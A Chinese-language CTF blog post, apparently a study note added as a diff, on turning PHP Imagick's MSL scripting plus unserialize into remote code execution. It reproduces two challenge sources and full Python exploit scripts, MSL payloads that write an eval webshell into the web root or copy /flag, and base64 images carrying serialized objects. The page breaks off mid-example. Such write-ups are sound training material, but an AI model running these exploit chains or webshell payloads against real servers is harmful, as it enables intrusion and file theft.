@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Imagick触发msl 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Imagick触发msl</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-06-27 16:43:33
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93401495">https://zhuanlan.zhihu.com/p/93401495</a><br>安装参考<br><a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a><br>参考文章</p>
+<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687708433292-4a89f96a-044f-4fa5-bc97-88c886c19130.png#averageHue=%232c3133&clientId=ub3e378b1-dc7b-4&from=paste&height=151&id=ue778ffe9&originHeight=151&originWidth=667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27545&status=done&style=none&taskId=u02a86d09-b57f-4f22-9a7e-504d4f7e44a&title=&width=667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687708436539-4c5e5ff5-206b-4f74-9b35-3ca2568c77b5.png#averageHue=%235a5958&clientId=ub3e378b1-dc7b-4&from=paste&height=234&id=u3355d2d9&originHeight=234&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17205&status=done&style=none&taskId=u2cf8b78f-ae0f-4796-9c96-b2f7eaaf33a&title=&width=869" alt="image.png"><br>这玩意可以对外进行访问</p>
+<p>配合msl脚本语言可以读取内外文件，并且写入指定位置<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687708717910-704dd227-54f6-4647-9954-29ecd6c7003a.png#averageHue=%23fefdfc&clientId=u7affa671-acb2-4&from=paste&height=317&id=u9d29497c&originHeight=317&originWidth=1432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59584&status=done&style=none&taskId=u912a6380-4b81-486e-8b2f-4dff4b779ba&title=&width=1432" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687708907448-edbe660c-168f-4625-997f-c1bc32099564.png#averageHue=%23747372&clientId=u7affa671-acb2-4&from=paste&height=627&id=u83402dbf&originHeight=627&originWidth=1475&originalType=binary&ratio=1&rotation=0&showTitle=false&size=172718&status=done&style=none&taskId=u694ab4ab-0dcc-4d2f-8a1c-0a534167b5e&title=&width=1475" alt="image.png"><br><strong>但是msl脚本得在本地</strong><br><strong>经常配合php_session_upload_progress上传临时文件使用</strong></p>
+<p>一些用法，还支持php协议<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687709715494-5a7e98d2-4ee8-4978-9053-0b7d8895779c.png#averageHue=%233e9546&clientId=u3a1adfa4-00c4-4&from=paste&height=878&id=u1286851f&originHeight=878&originWidth=1534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108331&status=done&style=none&taskId=u92c93582-5a18-48e8-a415-ee8c981483a&title=&width=1534" alt="image.png"></p>
+<h4 id="RCE1-看看就行"><a href="#RCE1-看看就行" class="headerlink" title="RCE1  看看就行"></a>RCE1  看看就行</h4><p>使用以下构造可能导致工作进程在web服务器上崩溃</p>
+<pre class="line-numbers language-none"><code class="language-none">new Imagick(&quot;text:fd:30&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687709873532-26fd498d-ba41-4332-8e22-009c9d7d2800.png#averageHue=%23fbfbfa&clientId=u3a1adfa4-00c4-4&from=paste&height=801&id=ub6fdc418&originHeight=801&originWidth=1632&originalType=binary&ratio=1&rotation=0&showTitle=false&size=135222&status=done&style=none&taskId=uc4f1afeb-ac06-4186-ad99-96ced7578a5&title=&width=1632" alt="image.png"><br>而在web服务崩溃时，会在&#x2F;tmp目录下生成php开头，后7位为[A-Za-z0-9]的文件<br>&#x2F;tmp&#x2F;phpXXXXXXX<br>在这种情况下我们可以进行条件竞争，使用bp大量发送上传了msl脚本的请求<img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687710115526-8b328d7b-cedf-4452-a3e4-f47b0718b36a.png#averageHue=%23f9f7f7&clientId=u3a1adfa4-00c4-4&from=paste&height=1139&id=u5f62e80e&originHeight=1139&originWidth=1324&originalType=binary&ratio=1&rotation=0&showTitle=false&size=244988&status=done&style=none&taskId=ucbfd2cee-0c1c-4068-9717-83671cbfa3b&title=&width=1324" alt="image.png"><br>再通过bp的intruder进行文件包含爆破<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687710162352-c0e694fd-7374-49a3-8e4e-8e1a4ae613f6.png#averageHue=%23f7f5f4&clientId=u3a1adfa4-00c4-4&from=paste&height=862&id=u005993d1&originHeight=862&originWidth=1221&originalType=binary&ratio=1&rotation=0&showTitle=false&size=168069&status=done&style=none&taskId=u568fcc27-eff3-43a7-aa1d-4e4ed623b2b&title=&width=1221" alt="image.png">此时就会调用msl脚本对远程文件发送请求，并将数据写回到本地</p>
+<h4 id="RCE2-高级版本，学这个！！"><a href="#RCE2-高级版本，学这个！！" class="headerlink" title="RCE2  高级版本，学这个！！"></a>RCE2  高级版本，学这个！！</h4><p>使用vid去触发msl脚本，可以使用通配符<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687710491309-2a78e8dd-5bc9-4a24-8d63-828a05dbd2ca.png#averageHue=%23faf8f8&clientId=u3a1adfa4-00c4-4&from=paste&height=855&id=u43190be1&originHeight=855&originWidth=1261&originalType=binary&ratio=1&rotation=0&showTitle=false&size=221530&status=done&style=none&taskId=u00849828-16b6-4355-b907-96cd7496cf4&title=&width=1261" alt="image.png"><br>vid:msl:&#x2F;tmp&#x2F;php*  直接执行上传缓存文件<br>配合caption:info:后接数据进行写入指定文件，比如说一句话木马写到web目录</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;image&gt;
+ &lt;read filename&#x3D;&quot;caption:&lt;?php @eval(@$_REQUEST[&#39;a&#39;]); ?&gt;&quot; &#x2F;&gt;
+ &lt;write filename&#x3D;&quot;info:&#x2F;var&#x2F;www&#x2F;swarm.php&quot; &#x2F;&gt;
+&lt;&#x2F;image&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+<h4 id="样题-ciscn2022-backdoor"><a href="#样题-ciscn2022-backdoor" class="headerlink" title="样题 ciscn2022 backdoor"></a>样题 ciscn2022 backdoor</h4><p>我真的不想搭linux的环境，这题大概看看脚本，理一下思路就行</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+error_reporting(E_ERROR);
+class backdoor &#123;
+    public $path &#x3D; null;
+    public $argv &#x3D; null;
+    public $class &#x3D; &quot;stdclass&quot;;
+    public $do_exec_func &#x3D; true;
+    
+    public function __sleep() &#123;
+        if (file_exists($this-&gt;path)) &#123;
+            return include $this-&gt;path;
+        &#125; else &#123;
+            throw new Exception(&quot;__sleep failed...&quot;);
+        &#125;
+    &#125;
+
+    public function __wakeup() &#123;
+            if (
+                $this-&gt;do_exec_func &amp;&amp; 
+                in_array($this-&gt;class, get_defined_functions()[&quot;internal&quot;])
+            ) &#123;
+                    call_user_func($this-&gt;class);
+            &#125; else &#123;
+                $argv &#x3D; $this-&gt;argv;
+                $class &#x3D; $this-&gt;class;
+                
+                new $class($argv);
+            &#125;
+    &#125;
+&#125;
+
+
+$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
+$data &#x3D; $_REQUEST[&#39;data&#39;];
+
+switch ($cmd) &#123;
+    case &#39;unserialze&#39;:
+        unserialize($data);
+        break;
+    
+    case &#39;rm&#39;:
+        system(&quot;rm -rf &#x2F;tmp&quot;);
+        break;
+    
+    default:
+        highlight_file(__FILE__);
+        break;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>有提供的exp，我们来分析一下</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python3
+#coding:utf-8
+
+import re
+import sys
+import time
+import requests
+
+timeout &#x3D; 30
+
+host &#x3D; sys.argv[1]
+port &#x3D; sys.argv[2]
+
+url &#x3D; f&quot;http:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&quot;
+write_session_payload &#x3D; &quot;O%3A8%3A%22backdoor%22%3A3%3A%7Bs%3A14%3A%22%00backdoor%00argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A15%3A%22%00backdoor%00class%22%3Bs%3A7%3A%22imagick%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A0%3B%7D&quot;
+session_sleep_chain_payload &#x3D; &quot;O%3A8%3A%22backdoor%22%3A2%3A%7Bs%3A5%3A%22class%22%3Bs%3A13%3A%22session_start%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A1%3B%7D&quot;
+
+def rm_tmp_file():
+    headers &#x3D; &#123;&quot;Accept&quot;: &quot;*&#x2F;*&quot;&#125;
+    requests.get(
+        f&quot;&#123;url&#125;&#x2F;?cmd&#x3D;rm&quot;,
+        headers&#x3D;headers
+    )
+
+def upload_session():
+    headers &#x3D; &#123;
+        &quot;Accept&quot;: &quot;*&#x2F;*&quot;,
+        &quot;Content-Type&quot;: &quot;multipart&#x2F;form-data; boundary&#x3D;------------------------c32aaddf3d8fd979&quot;
+    &#125;
+    data &#x3D; &quot;--------------------------c32aaddf3d8fd979\r\nContent-Disposition: form-data; name&#x3D;\&quot;swarm\&quot;; filename&#x3D;\&quot;swarm.msl\&quot;\r\nContent-Type: application&#x2F;octet-stream\r\n\r\n&lt;?xml version&#x3D;\&quot;1.0\&quot; encoding&#x3D;\&quot;UTF-8\&quot;?&gt;\r\n&lt;image&gt;\r\n &lt;read filename&#x3D;\&quot;inline:data:&#x2F;&#x2F;image&#x2F;x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw&#x2F;cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30&#x3D;\&quot; &#x2F;&gt;\r\n &lt;write filename&#x3D;\&quot;&#x2F;tmp&#x2F;sess_afkl\&quot; &#x2F;&gt;\r\n&lt;&#x2F;image&gt;\r\n--------------------------c32aaddf3d8fd979--&quot;
+    try:
+        requests.post(
+            f&quot;&#123;url&#125;&#x2F;?data&#x3D;O%3A8%3A%22backdoor%22%3A3%3A%7Bs%3A14%3A%22%00backdoor%00argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A15%3A%22%00backdoor%00class%22%3Bs%3A7%3A%22imagick%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A0%3B%7D&amp;cmd&#x3D;unserialze&quot;,
+            headers&#x3D;headers, data&#x3D;data
+        )
+    except requests.exceptions.ConnectionError:
+        pass
+
+def get_flag():
+    cookies &#x3D; &#123;&quot;PHPSESSID&quot;: &quot;afkl&quot;&#125;
+    headers &#x3D; &#123;&quot;Accept&quot;: &quot;*&#x2F;*&quot;&#125;
+    response &#x3D; requests.get(
+        f&quot;&#123;url&#125;&#x2F;?data&#x3D;O%3A8%3A%22backdoor%22%3A2%3A%7Bs%3A5%3A%22class%22%3Bs%3A13%3A%22session_start%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A1%3B%7D&amp;cmd&#x3D;unserialze&amp;1&#x3D;system(&#39;&#x2F;readflag&#39;);&quot;, 
+        headers&#x3D;headers, cookies&#x3D;cookies
+    )
+    return re.findall(r&quot;(flag\&#123;.*\&#125;)&quot;, response.text)
+
+# 主逻辑
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    rm_tmp_file()
+    upload_session()
+
+    time.sleep(1)
+
+    print(get_flag()[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>rm_tmp_file删除了tmp目录下的文件，防止影响判断<br>使用call_user_func触发session_start(），携带phpsessid，保存缓存数据，后面session反序列化要用<br>在upload session路由，使用反序列化触发 new imagick(vid:msl:&#x2F;tmp&#x2F;php*)，执行上传的msl脚本<br>msl脚本内容如下</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;\&quot;1.0\&quot; encoding&#x3D;\&quot;UTF-8\&quot;?&gt;\r\n&lt;image&gt;\r\n &lt;read filename&#x3D;\&quot;inline:data:&#x2F;&#x2F;image&#x2F;x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw&#x2F;cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30&#x3D;\&quot; &#x2F;&gt;\r\n &lt;write filename&#x3D;\&quot;&#x2F;tmp&#x2F;sess_afkl\&quot; &#x2F;&gt;\r\n&lt;&#x2F;image&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>里面的base64是利用ppm图像文件格式的特点，在末尾插入序列化数据而不影响图片正常解析生成的<br>m1师傅博客偷的脚本改改</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+class backdoor
+&#123;
+    public $path &#x3D; null;
+    public $argv &#x3D; null;
+    public $class &#x3D; &quot;stdclass&quot;;
+    public $do_exec_func &#x3D; true;
+&#125;
+
+$fumo &#x3D; new backdoor();
+$fumo-&gt;path &#x3D; &quot;&#x2F;tmp&#x2F;sess_afkl&quot;;
+$serialized &#x3D; &quot;|&quot; . serialize($fumo);
+#前面可以加一句话木马，这题就是这样加的
+
+echo base64_encode(&quot;P6\n9 9\n255\n&quot; . str_repeat(&quot;A&quot;, 9 * 9 * 3 - strlen($serialized)) . $serialized);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>会将base64解密后的内容写入&#x2F;tmp&#x2F;sess_afkl，其中就包含一句话木马，以及session反序列化所需的数据<br>最后再携带者phpsessionid&#x3D;afkl，并且用call_user_func开启session_start，访问即可触发sleep，包含&#x2F;tmp&#x2F;sess_afkl文件，其中存在一句话木马，执行命令</p>
+<h4 id="样题-SCTF-fumo-backdoor"><a href="#样题-SCTF-fumo-backdoor" class="headerlink" title="样题 SCTF  fumo_backdoor"></a>样题 SCTF  fumo_backdoor</h4><p>和上面一个出题人，不过这里用的是readfile，没法包含木马，flag在&#x2F;flag</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+error_reporting(0);
+ini_set(&#39;open_basedir&#39;, __DIR__.&quot;:&#x2F;tmp&quot;);
+define(&quot;FUNC_LIST&quot;, get_defined_functions());
+
+class fumo_backdoor &#123;
+    public $path &#x3D; null;
+    public $argv &#x3D; null;
+    public $func &#x3D; null;
+    public $class &#x3D; null;
+    
+    public function __sleep() &#123;
+        if (
+            file_exists($this-&gt;path) &amp;&amp; 
+            preg_match_all(&#39;&#x2F;[flag]&#x2F;m&#39;, $this-&gt;path) &#x3D;&#x3D;&#x3D; 0
+        ) &#123;
+            readfile($this-&gt;path);
+        &#125;
+    &#125;
+
+    public function __wakeup() &#123;
+        $func &#x3D; $this-&gt;func;
+        if (
+            is_string($func) &amp;&amp; 
+            in_array($func, FUNC_LIST[&quot;internal&quot;])
+        ) &#123;
+            call_user_func($func);
+        &#125; else &#123;
+            $argv &#x3D; $this-&gt;argv;
+            $class &#x3D; $this-&gt;class;
+            
+            new $class($argv);
+        &#125;
+    &#125;
+&#125;
+
+$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
+$data &#x3D; $_REQUEST[&#39;data&#39;];
+
+switch ($cmd) &#123;
+    case &#39;unserialze&#39;:
+        unserialize($data);
+        break;
+    
+    case &#39;rm&#39;:
+        system(&quot;rm -rf &#x2F;tmp 2&gt;&#x2F;dev&#x2F;null&quot;);
+        break;
+    
+    default:
+        highlight_file(__FILE__);
+        break;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这题很搞，我自己用bp上传失败了很多次，还是用脚本吧</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests,base64,time
+SERVER_ADDR&#x3D;&quot;http:&#x2F;&#x2F;182.92.6.230:18080&#x2F;&quot;
+
+
+def del_tem():  #删除tmp目录下所有的缓存文件
+    resp &#x3D; requests.post(SERVER_ADDR,data&#x3D;&#123;&quot;cmd&quot;:&quot;rm&quot;&#125;)
+    print(resp.status_code)
+
+
+def write_file(xml:str):
+    unserialize_str&#x3D;base64.b64decode(&quot;TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7YToxOntpOjA7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO31zOjQ6ImZ1bmMiO047czo1OiJjbGFzcyI7czo3OiJJbWFnaWNrIjt9&quot;)
+    resp&#x3D; requests.post(SERVER_ADDR,files&#x3D;&#123;&quot;file&quot;:(&quot;exec1.msl&quot;,xml)&#125;,data&#x3D;&#123;&quot;cmd&quot;:&quot;unserialze&quot;,&quot;data&quot;:unserialize_str&#125;)
+    print(resp.status_code)
+
+def start_session(): #开启session_start()，这样就会生成phpsessid缓存文件，就能触发php的session反序列化
+    resp&#x3D;requests.get(SERVER_ADDR+&quot;?cmd&#x3D;unserialze&amp;data&#x3D;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;)
+
+
+def get_flag_session_unserialze(): #指定sessionid，session反序列化触发sleep函数，读取&#x2F;tmp&#x2F;Aecous文件，获得flag
+    resp&#x3D;requests.get(SERVER_ADDR+&quot;?cmd&#x3D;unserialze&amp;data&#x3D;O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3Bs%3A8%3A%22%2Ftmp%2Fyyz%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D&quot;,
+                      cookies&#x3D;&#123;&quot;PHPSESSID&quot;:&quot;Aecous&quot;&#125;)
+    print(resp.text)
+
+
+del_tem()
+time.sleep(2)
+
+start_session()
+time.sleep(2)
+
+del_tem()
+time.sleep(2)
+
+# xml&#x3D;f&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+# &lt;image&gt;
+#  &lt;read filename&#x3D;&quot;mvg:&#x2F;flag&quot; &#x2F;&gt;
+#  &lt;write filename&#x3D;&quot;mvg:&#x2F;tmp&#x2F;yyz&quot; &#x2F;&gt;
+# &lt;&#x2F;image&gt;&quot;&quot;&quot;
+#
+# xml2&#x3D;f&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+# &lt;image&gt;
+#  &lt;read filename&#x3D;&quot;inline:data:text&#x2F;8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9&quot; &#x2F;&gt;
+#  &lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sess_&#123;session_id&#125;&quot; &#x2F;&gt;
+# &lt;&#x2F;image&gt;&quot;&quot;&quot;
+
+xml&#x3D;f&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;image&gt;
+ &lt;read filename&#x3D;&quot;inline:data:&#x2F;&#x2F;image&#x2F;x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF8TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtzOjExOiIvdG1wL0FlY291cyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30&#x3D;&quot; &#x2F;&gt; 
+ &lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sess_Aecous&quot; &#x2F;&gt;
+&lt;&#x2F;image&gt;&quot;&quot;&quot;
+
+xml2&#x3D;f&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;image&gt;
+ &lt;read filename&#x3D;&quot;mvg:&#x2F;flag&quot; &#x2F;&gt;
+ &lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;Aecous&quot; &#x2F;&gt;
+&lt;&#x2F;image&gt;
+&quot;&quot;&quot;
+#上传msl脚本，导致web服务崩溃并且生成php缓存文件，一般为phpXXXXXX,配合Imagick(vid:msl:&#x2F;tmp&#x2F;php*)执行msl脚本，将session反序列化所需的数据写入&#x2F;tmp&#x2F;sess_指定id，
+write_file(xml)
+time.sleep(3)
+
+#上传msl脚本，配合Imagick(vid:msl:&#x2F;tmp&#x2F;php*)执行msl脚本，将flag移到指定位置
+write_file(xml2)
+time.sleep(3)
+
+get_flag_session_unserialze()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>结合wm的脚本改的，和上一题思路基本一样，看看注释就行</p>
+<h4 id="msl脚本标签"><a href="#msl脚本标签" class="headerlink" title="msl脚本标签"></a>msl脚本标签</h4><p>读取</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mvg:/flag<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mvg:/tmp/yyz<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>mvg:对文件头似乎没有强制要求,可以用来移动指定的文件<br>还可以用uyvy</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;image&gt;
+&lt;read filename&#x3D;&quot;uyvy:&#x2F;flag&quot;&#x2F;&gt;
+&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;2333hhhh&quot;&#x2F;&gt;
+&lt;&#x2F;image&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>数据转换写入</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span>
